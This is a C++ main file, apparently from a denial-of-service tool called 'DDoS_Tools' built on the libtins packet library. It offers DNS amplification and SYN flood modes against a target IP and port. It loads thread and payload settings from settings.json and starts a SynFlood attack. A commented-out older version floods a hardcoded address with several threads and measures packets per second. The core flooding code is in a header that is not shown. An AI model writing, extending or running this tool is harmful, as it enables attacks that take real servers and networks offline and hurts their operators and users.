#include <tins/tins.h>
#include <iostream>
#include <sstream>
#include <nlohmann/json.hpp>
#include <fstream>
#include "SynFlood.h"

using namespace Tins;

enum smode_t { dns_amplification_attack, syn_flood_attack};

int main(int argc, char* argv[]) {
    try {
        if(argc < 2){
            std::cout << "How to use: " << std::endl;
            std::cout << "- DNS Amplification attack" << std::endl;
            std::cout << "  sudo ./DDoS_Tools -d {TARGET_IP}" << std::endl;
            std::cout << "- SynFlood attack" << std::endl;
            std::cout << "  sudo ./DDoS_Tools -s {TARGET_IP} {TARGET_PORT}" << std::endl;
            exit(-1);
        }
        std::ifstream json_file("settings.json");
        nlohmann::json json_data = nlohmann::json::parse(json_file);

        std::string target_ip(argv[2]);
        if(strcmp(argv[1], "-d")==0){
            std::cout << "DNS Amplification attack to " << target_ip << std::endl;
        } else {
            uint16_t target_port = argc<3 ? 80: std::stoi(argv[3]);
            std::cout << "SynFlood attack to " << target_ip << " on port " << target_port << std::endl;
            SynFlood synFlood(target_ip, target_port, json_data["upload_size"], json_data["threads_number"]);
            synFlood.run();
        }
//        std::cout << "Settings: " << json_data.dump(4) << std::endl;
    }
    catch (const nlohmann::json::parse_error& e) {
        std::cout << "An error has occurred while reading the settings.json file!" << std::endl;
        exit(-2);
    }


}
//int main(int argc, char* argv[]) {
//    IPv4Address dst("192.168.1.24");
//    uint16_t dst_port = 80;
//    unsigned counter = 1000000;
//    unsigned threads_number = 4;
//    std::vector<std::thread> threads;
//    threads.reserve(threads_number);
//
//    auto start = std::chrono::steady_clock::now();
//    for(int i=0; i<threads_number; i++){
//        threads.emplace_back(syn_flood, dst, dst_port, counter);
//    }
//    for(std::thread &t: threads){
//        t.join();
//    }
//    auto end = std::chrono::steady_clock::now();
//    std::chrono::duration<double> elapsed_seconds = end-start;
//    std::cout << "elapsed time: " << elapsed_seconds.count() << std::endl;
//    std::cout << "pps: " << threads_number * counter/elapsed_seconds.count() << "p/s" << std::endl;
//
//}